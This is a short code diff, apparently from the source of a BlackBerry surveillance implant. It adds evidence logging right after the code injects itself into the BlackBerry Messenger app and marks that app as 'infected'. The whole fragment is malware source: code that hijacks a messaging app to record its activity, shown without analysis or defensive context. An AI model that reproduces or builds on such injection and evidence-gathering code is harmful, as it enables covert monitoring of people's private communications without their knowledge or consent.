@@ -20,6 +20,7 @@ import net.rim.device.api.ui.Screen;
 import net.rim.device.api.ui.UiApplication;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
+import blackberry.evidence.Evidence;
 import blackberry.injection.FieldExplorer;
 import blackberry.injection.MenuWalker;
 import blackberry.utils.Utils;
@@ -130,8 +131,8 @@ public class BBMMenuItem extends ApplicationMenuItem {
                 //#ifdef DEBUG
                 debug.info("BBM INJECTED!");
                 debug.ledFlash(Debug.COLOR_GREEN);
-
                 //#endif
+                Evidence.info("BBM");
                 AppInjectorBBM.getInstance().setInfected();
 
             } else {
